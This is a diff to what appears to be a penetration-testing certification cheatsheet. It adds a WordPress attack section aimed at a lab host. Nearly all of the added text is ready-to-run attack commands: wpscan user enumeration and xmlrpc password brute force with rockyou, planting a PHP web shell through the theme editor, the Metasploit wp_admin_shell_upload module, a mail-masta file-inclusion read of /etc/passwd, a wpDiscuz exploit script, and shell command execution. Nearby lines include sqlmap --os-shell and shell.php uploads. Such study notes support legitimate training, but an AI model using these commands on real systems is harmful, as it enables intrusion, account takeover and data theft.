@@ -75,7 +75,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
 - [Attacking Common Applications](#attacking-common-applications)
-  	- [Application Discovery - Enumeration](#application-discovery-enumeration)
+  	- [Application Enumeration](#application-enumeration)
+  	- [WordPress](#WordPress)
   	- [Splunk](#splunk)
   	- [PRTG](#prtg)
   	- [GITLAB](#gitlab)
@@ -1917,12 +1918,37 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 ## Attacking Common Applications
-### Application Discovery - Enumeration
+### Application - Enumeration
 ```
 - nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
 - eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
 - cat web_discovery.xml | ./aquatone -nmap
 
+```
+### WordPress
+```
+- curl -s http://blog.inlanefreight.local | grep WordPress
+- curl -s http://blog.inlanefreight.local/ | grep themes
+- curl -s http://blog.inlanefreight.local/ | grep plugins
+- curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
+- http://blog.inlanefreight.local/wp-login.php
+- sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
+- wpscan --url http://blog.inlanefreight.local/
+- user enum
+	-->  wpscan --url http://blog.inlanefreight.local --enumerate u
+-  Brute force
+	-->  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+- Command injection or Code Execution
+	--> login with admin --> http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
+	--> update file --> system($_GET[0]);
+	--> curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+- mfs
+	--> use exploit/unix/webapp/wp_admin_shell_upload
+- Vulnerable Plugins - mail-masta
+	--> curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+- Vulnerable Plugins - wpDiscuz
+	--> python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+- curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
 ```
 ### Splunk
 ```
